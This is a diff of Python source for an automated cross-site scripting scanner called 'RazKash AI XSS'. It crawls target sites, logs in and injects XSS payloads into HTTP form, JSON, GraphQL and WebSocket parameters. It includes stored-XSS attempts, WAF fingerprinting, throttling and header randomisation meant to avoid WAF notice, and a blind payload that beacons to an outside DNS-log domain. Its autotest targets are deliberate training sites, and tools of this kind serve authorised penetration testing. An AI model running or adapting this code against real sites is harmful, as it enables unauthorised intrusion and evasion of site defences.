-# ─────────────────────────────────────────────────────────────────────────────
-#                            LOGGING
-# ─────────────────────────────────────────────────────────────────────────────
-
-if not LOGFILE.exists():
-    LOGFILE.write_text(f"# RazKash Findings v{VER}\n\n", "utf-8")
-
-_hits = set()
-log_lock = threading.Lock()
-
-def log_hit(url, method, payload, params=None):
-    params = params or []
-    entry = f"- **XSS** {method} `{url}` param={params} payload=`{payload}`\n"
-    with log_lock:
-        if entry in _hits:
-            return
-        _hits.add(entry)
-        LOGFILE.write_text(LOGFILE.read_text("utf-8") + entry, "utf-8")
-    logging.info(entry.strip())
-
-# ─────────────────────────────────────────────────────────────────────────────
-#                          SESSION / AUTH
-# ─────────────────────────────────────────────────────────────────────────────
-
-def get_authenticated_session():
-    s = requests.Session()
-    if args.login_url and args.username and args.password:
-        if args.login_url.endswith("/rest/user/login"):
-            # JSON-based login
-            h = random_headers()
-            h["Content-Type"] = "application/json"
-            try:
-                r = s.post(args.login_url, json={"email": args.username, "password": args.password},
-                           headers=h, timeout=HTTP_TIMEOUT, verify=False)
-                j = r.json()
-                token = j.get("token") or j.get("authentication",{}).get("token")
-                if token:
-                    s.headers.update({"Authorization": f"Bearer {token}"})
-            except:
-                pass
-        else:
-            # HTML form-based login
-            r0 = s.get(args.login_url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
-            csrf_val = re.search(f'name="{args.csrf_field}" value="([^"]+)"', r0.text)
-            data = {}
-            if csrf_val:
-                data[args.csrf_field] = csrf_val.group(1)
-            data.update({"username": args.username, "password": args.password})
-            s.post(args.login_url, data=data, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
-
-    s.mount("https://", HTTPAdapter(pool_connections=50, pool_maxsize=50))
-    s.mount("http://",  HTTPAdapter(pool_connections=50, pool_maxsize=50))
-    return s
-
-SESSION = get_authenticated_session()
-
-# ─────────────────────────────────────────────────────────────────────────────
-#                          GRAPHQL HELPERS
-# ─────────────────────────────────────────────────────────────────────────────
-
-INTROSPECTION = """ query IntrospectionQuery {
-  __schema {
-    queryType { name }
-    mutationType { name }
-    types {
-      kind name
-      fields { name args { name type { kind name ofType { kind } } } }
-    }
-  }
-}
-"""
-
-def discover_graphql_ops(ep):
-    try:
-        j = SESSION.post(ep, json={"query": INTROSPECTION}, timeout=HTTP_TIMEOUT, verify=False).json()
-        schema = j["data"]["__schema"]
-        ops = []
-        for kind in ("queryType","mutationType"):
-            root = schema.get(kind)
-            if not root:
-                continue
-            for t in schema["types"]:
-                if t["name"] == root["name"]:
-                    for f in t["fields"]:
-                        # string args
-                        arg_names = [a["name"] for a in f["args"] if a["type"]["name"] == "String"]
-                        if arg_names:
-                            ops.append((f["name"], arg_names))
-        return ops
-    except:
-        return []
-
-def fuzz_graphql(ep):
-    ops = discover_graphql_ops(ep)
-    for name, args_ in ops:
-        for a in args_:
-            payload = '<img src=x onerror=alert(1)>'
-            try:
-                SESSION.post(
-                    ep,
-                    json={"query": f"mutation{{{name}({a}:\"{payload}\"){{__typename}}}}"},
-                    timeout=HTTP_TIMEOUT,
-                    verify=False
-                )
-                # Basic attempt, not verified in a browser here
-            except Exception as ex:
-                dbg(f"[fuzz_graphql] {ex}")
-
-# ─────────────────────────────────────────────────────────────────────────────
-#                            CRAWLING
-# ─────────────────────────────────────────────────────────────────────────────
-
-def mine_js(url, host):
-    """Extract possible subrequests from JS content."""
-    found = []
-    try:
-        r = SESSION.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
-        txt = r.text
-        js_call_re = re.compile(
-            r'(?:fetch\(["\']|axios\.\w+\(["\']|XHR\.open\(["\'](GET|POST)["\'],\s*)(/[^"\']+\.(?:js|php|asp|json|graphql)(?:\?[^"\']*)?)["\']',
-            re.IGNORECASE
-        )
-        js_url_re  = re.compile(r'["\'](/[^"\']+\.(?:js|php|asp|json|graphql)(?:\?[^"\']*)?)["\']', re.IGNORECASE)
-
-        found += [m[1] for m in js_call_re.findall(txt)]
-        found += js_url_re.findall(txt)
-    except:
-        pass
-
-    out = set()
-    for u in found:
-        full = urllib.parse.urljoin(url, u)
-        if urllib.parse.urlparse(full).netloc.lower() == host:
-            out.add(full)
-    return list(out)
-
-def misc_assets(root):
-    """Look for additional assets like sitemap or robots."""
-    base = urllib.parse.urlparse(root)._replace(path="",query="",fragment="").geturl()
-    assets = []
-    # robots.txt
-    try:
-        txt = SESSION.get(base + "/robots.txt", headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False).text
-        for line in txt.splitlines():
-            if line.lower().startswith("sitemap:"):
-                assets.append(line.split(":",1)[1].strip())
-    except:
-        pass
-    return assets
-
-def crawl_static(root, cap, depth=0):
-    visited = set()
-    queue = [root] + misc_assets(root)
-    results = []
-    host = urllib.parse.urlparse(root).netloc.lower()
-
-    while queue and len(visited) < cap:
-        u = queue.pop(0)
-        if u in visited:
-            continue
-        visited.add(u)
-        try:
-            r = SESSION.get(u, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
-        except:
-            continue
-        ct = (r.headers.get("content-type") or "").lower()
-        # If JS, mine more links
-        if "javascript" in ct:
-            for jurl in mine_js(u, host):
-                if jurl not in visited:
-                    queue.append(jurl)
-            continue
-        # If not HTML, skip
-        if "html" not in ct:
-            continue
-
-        soup = BeautifulSoup(r.text, "html.parser")
-
-        # Iframes
-        if args.crawl_iframes and depth < args.nested_depth:
-            for ifr in soup.find_all("iframe", src=True):
-                src = urllib.parse.urljoin(u, ifr["src"])
-                if urllib.parse.urlparse(src).netloc.lower() == host:
-                    queue.append(src)
-
-        # scripts
-        for sc in soup.find_all("script", src=True):
-            scr = urllib.parse.urljoin(u, sc["src"])
-            if urllib.parse.urlparse(scr).netloc.lower() == host:
-                queue.append(scr)
-
-        # anchors
-        for a in soup.find_all("a", href=True):
-            link = urllib.parse.urljoin(u, a["href"])
-            pu   = urllib.parse.urlparse(link)
-            if pu.netloc.lower() != host:
-                continue
-            if link not in visited:
-                queue.append(link)
-            if pu.query:
-                qs = list(urllib.parse.parse_qs(pu.query).keys())
-                results.append({"url": pu._replace(query="").geturl(), "method": "GET", "params": qs})
-
-        # forms
-        for f in soup.find_all("form"):
-            act = urllib.parse.urljoin(u, f.get("action") or u)
-            if urllib.parse.urlparse(act).netloc.lower() != host:
-                continue
-            meth = f.get("method","get").upper()
-            ps = [i.get("name") for i in f.find_all(["input","textarea","select"]) if i.get("name")]
-            if ps:
-                results.append({"url": act, "method": meth, "params": ps})
-
-    return results
-
-def crawl_dynamic(root):
-    """Uses Playwright to capture dynamic requests (XHR, fetch) if available."""
-    if not sync_playwright:
-        return []
-    found = []
-    seen  = set()
-    host  = urllib.parse.urlparse(root).netloc.lower()
-
-    try:
-        with sync_playwright() as p:
-            br = p.chromium.launch(
-                headless=not args.headed,
-                args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"]
-            )
-            ctx = br.new_context(ignore_https_errors=True, user_agent=UserAgent().random)
-            page = ctx.new_page()
-
-            def on_req(req):
-                u = req.url
-                if urllib.parse.urlparse(u).netloc.lower() != host or u in seen:
-                    return
-                seen.add(u)
-                m = req.method.upper()
-                hd = req.headers.get("content-type","").lower()
-                is_json = ("json" in hd or "graph" in hd)
-                try:
-                    data = json.loads(req.post_data or "{}")
-                except:
-                    data = {}
-                qs = list(urllib.parse.urlparse(u).query.split("&")) if "?" in u else []
-                if data:
-                    param_names = list(data.keys())
-                else:
-                    param_names = [q.split("=")[0] for q in qs if q] or ["payload"]
-                found.append({
-                    "url": u.split("?", 1)[0],
-                    "method": m if m in ("POST","PUT") else "GET",
-                    "params": param_names,
-                    "json": is_json,
-                    "template": data
-                })
-
-            page.on("request", on_req)
-            page.goto(root, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
-            time.sleep(1)
-
-            # (Optional) Could simulate more interactions here if needed
-
-            ctx.close()
-            br.close()
-    except:
-        pass
-    return found
-
-# ─────────────────────────────────────────────────────────────────────────────
-#                     FUZZING (HTTP & WEBSOCKETS)
-# ─────────────────────────────────────────────────────────────────────────────
-
-static_exts = {
-    "png","jpg","jpeg","gif","bmp","svg","webp","ico",
-    "css","woff","woff2","ttf","eot","otf","mp4","mp3","webm",
-    "pdf","zip","rar","7z","tar","gz"
-}
-
-def set_deep(obj, path, val):
-    """Set a deep key in a nested dict or list, e.g. foo.bar[2].baz."""
-    parts = re.split(r'\.|(\[\d+\])', path)
-    parts = [p for p in parts if p and p.strip()]
-    cur = obj
-    for i, part in enumerate(parts):
-        is_last = (i == len(parts)-1)
-        if part.startswith('[') and part.endswith(']'):
-            idx = int(part[1:-1])
-            if is_last:
-                cur[idx] = val
-            else:
-                if isinstance(cur[idx], (dict, list)):
-                    cur = cur[idx]
-                else:
-                    cur[idx] = {}
-                    cur = cur[idx]
-        else:
-            if is_last:
-                cur[part] = val
-            else:
-                if part not in cur or not isinstance(cur[part], (dict, list)):
-                    cur[part] = {}
-                cur = cur[part]
-
-def fuzz_http(t: Dict[str,Any]) -> None:
-    # Skip truly static resources by extension
-    ext = Path(urllib.parse.urlparse(t["url"]).path).suffix.lstrip('.').lower()
-    if ext in static_exts:
-        return
-
-    # Throttle to avoid WAF suspicion
-    rate_limit()
-    session_splice()
-
-    # Probe first
-    try:
-        probe = {p: "" for p in t["params"]}
-        r0 = (SESSION.get if t["method"]=="GET" else SESSION.post)(
-            t["url"],
-            params=probe if t["method"]=="GET" else None,
-            data=probe  if t["method"]=="POST" else None,
-            headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False
-        )
-        if r0.status_code != 200:
-            return
-        if "image" in (r0.headers.get("content-type","").lower()):
-            return
-    except:
-        return
-
-    # Choose payload set
-    if args.blind and DNSLOG_DOMAIN:
-        # single blind vector
-        templates = [
-            f"<script>new Image().src='http://{DNSLOG_DOMAIN}/?p='+encodeURIComponent('{randstr()}')</script>"
-        ]
-    else:
-        templates = PAYLOADS
-
-    for tpl in templates:
-        payload = tpl
-        if "MASK" in payload:
-            payload = ai_mutate(payload)
-        if args.polymorph:
-            payload = polymorph(payload)
-
-        try:
-            if t.get("json") and "template" in t:
-                body = json.loads(json.dumps(t["template"]))
-                for param in t["params"]:
-                    set_deep(body, param, payload)
-                resp = SESSION.post(
-                    t["url"],
-                    json=body,
-                    headers={"Content-Type":"application/json"},
-                    timeout=HTTP_TIMEOUT,
-                    verify=False
-                )
-                sent_data = body
-            else:
-                sent_data = {p: payload for p in t["params"]}
-                resp = (SESSION.get if t["method"]=="GET" else SESSION.post)(
-                    t["url"],
-                    params=sent_data if t["method"]=="GET" else None,
-                    data=sent_data  if t["method"]=="POST" else None,
-                    headers=random_headers(),
-                    timeout=HTTP_TIMEOUT,
-                    verify=False
-                )
-
-            # Basic WAF block check
-            if resp.status_code in (403, 429, 503) or any(x in resp.text for x in ("captcha","denied","blocked")):
-                continue
-            # Skip SQL error pages
-            if SQL_ERROR_RE.search(resp.text):
-                continue
-
-            # Blind
-            if args.blind:
-                log_hit(t["url"], "BLIND", payload, t["params"])
-                return
-
-            # Reflected or "all" -> verify in a browser
-            if verify(t["url"], t["method"], sent_data, t.get("json", False)):
-                log_hit(t["url"], t["method"], payload, t["params"])
-                return
-
-        except Exception as ex:
-            dbg(f"[fuzz_http] {ex}")
-        jitter()
-
-def fuzz_ws(t: Dict[str,Any]) -> None:
-    """Attempt a WS-based injection if websockets are in use."""
-    if not websocket:
-        return
-    if not t["url"].startswith(("ws://","wss://")):
-        return
-
-    url = t["url"]
-    params = t.get("params", [])
-    tpl = t.get("template") or {}
-    marker = randstr()
-
-    try:
-        body = json.loads(json.dumps(tpl))
-    except:
-        body = {}
-
-    if body:
-        set_deep(body, random.choice(params), f"<img src onerror=alert('{marker}')>")
-    else:
-        if params:
-            body[random.choice(params)] = f"<svg onload=alert('{marker}')></svg>"
-        else:
-            body["payload"] = f"<svg onload=alert('{marker}')></svg>"
-
-    payload = json.dumps(body)
-    hit = False
-
-    def on_msg(wsapp, msg):
-        nonlocal hit
-        if marker in msg:
-            hit = True
-
-    try:
-        wsapp = websocket.WebSocketApp(url, on_message=on_msg, header=random_headers())
-        thr = threading.Thread(target=wsapp.run_forever, kwargs={"sslopt":{"cert_reqs": ssl.CERT_NONE}})
-        thr.daemon = True
-        thr.start()
-        time.sleep(1)
-        wsapp.send(payload)
-        time.sleep(3)
-        wsapp.close()
-        if hit:
-            log_hit(url, "WS", payload, params)
-    except Exception as ex:
-        dbg(f"[fuzz_ws] {ex}")
-
-# ─────────────────────────────────────────────────────────────────────────────
-#                          WAF DETECTION
-# ─────────────────────────────────────────────────────────────────────────────
-
-def detect_waf(url: str) -> str:
-    sigs = {
-        "cloudflare": ["__cf_bm","cf-ray","Cloudflare Ray ID"],
-        "akamai":     ["AkamaiGHost","akamai"],
-        "sucuri":     ["sucuri_cloudproxy_uuid","Access Denied - Sucuri"],
-        "imperva":    ["visid_incap_","incapsula"],
-    }
-    try:
-        r = SESSION.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
-        t = r.text.lower()
-        for n, pats in sigs.items():
-            if any(p.lower() in t for p in pats):
-                return n
-    except:
-        pass
-    return "unknown"
-
-# ─────────────────────────────────────────────────────────────────────────────
-#                              MAIN
-# ─────────────────────────────────────────────────────────────────────────────
-
-AUTOTEST = [
-    "http://xss-game.appspot.com/",
-    "http://xss-game.appspot.com/level1",
-    "https://juice-shop.herokuapp.com/"
-]
-
 def main():
-    # Determine mode
-    mode = "all"
+    mode="all"
     if args.reflected:
-        mode = "reflected"
+        mode="reflected"
     elif args.stored:
-        mode = "stored"
+        mode="stored"
     elif args.blind:
-        mode = "blind"
+        mode="blind"
 
-    # Determine target(s)
     if args.autotest:
-        roots = [smart_url(u) for u in AUTOTEST]
+        roots=[smart_url(u) for u in AUTOTEST]
     elif args.url:
-        roots = [smart_url(args.url)]
+        roots=[smart_url(args.url)]
     else:
         ap.print_help()
         sys.exit(1)
 
     logging.info(f"\n┌─ RazKash AI XSS v{VER}")
 
-    # Optional WAF detection
     if args.detect_waf:
         for r in roots:
-            waf_name = detect_waf(r)
-            logging.info(f"│   WAF on {r}: {waf_name}")
+            w=detect_waf(r)
+            logging.info(f"│   WAF on {r}: {w}")
 
     for root in roots:
-        logging.info(f"├─▶ Crawling: {root}")
+        logging.info(f"├─▶ {root}")
+        static_targets=crawl_static(root,args.max_pages,depth=1)
+        dynamic_targets=crawl_dynamic(root)
 
-        # Crawl
-        static_targets  = crawl_static(root, args.max_pages, depth=1)
-        dynamic_targets = crawl_dynamic(root)
-
-        # If GraphQL endpoint
+        # GraphQL check
         if "graphql" in root.lower():
             fuzz_graphql(root)
 
-        # Combine
-        all_targets = static_targets + dynamic_targets
+        all_targets=static_targets+dynamic_targets
 
-        # Stored XSS attempt
-        if mode == "stored":
+        if mode=="stored":
+            # Attempt storing with each payload from stored_payloads
             for t in static_targets:
-                if t["method"] in ("POST","PUT") and not t.get("json", False):
+                if t["method"] in ("POST","PUT") and not t.get("json",False):
                     for pay in stored_payloads:
-                        SESSION.post(
-                            t["url"],
-                            data={p: pay for p in t["params"]},
-                            headers=random_headers(),
-                            timeout=HTTP_TIMEOUT,
-                            verify=False
-                        )
-                        # Then check if it's reflected when the page is loaded
-                        if verify(t["url"], "GET", {}, False):
-                            # Or pass data if you want to re-send parameters
-                            log_hit(t["url"], "STORED", pay, t["params"])
+                        try:
+                            SESSION.post(
+                                t["url"],
+                                data={p: pay for p in t["params"]},
+                                headers=random_headers(),
+                                timeout=HTTP_TIMEOUT, verify=False
+                            )
+                            # Then check
+                            if verify(t["url"],"GET",{},False):
+                                log_hit(t["url"],"STORED",pay,t["params"])
+                        except Exception as e:
+                            dbg(f"[stored] {e}")
 
-
-        # Blind / Reflected / All
-        elif mode in ("reflected","blind","all"):
-            http_targets = [x for x in all_targets if not x["url"].startswith(("ws://","wss://"))]
-            ws_targets   = [x for x in all_targets if x["url"].startswith(("ws://","wss://"))]
+        elif mode in ("blind","reflected","all"):
+            http_targets=[x for x in all_targets if not x["url"].startswith(("ws://","wss://"))]
+            ws_targets=[x for x in all_targets if x["url"].startswith(("ws://","wss://"))]
 
             with ThreadPoolExecutor(max_workers=args.threads) as pool:
                 pool.map(fuzz_http, http_targets)
-                pool.map(fuzz_ws,   ws_targets)
+                pool.map(fuzz_ws, ws_targets)
 
     logging.info(f"└─ Findings saved → {LOGFILE.resolve()}\n")
 
-if __name__ == "__main__":
+if __name__=="__main__":
     main()
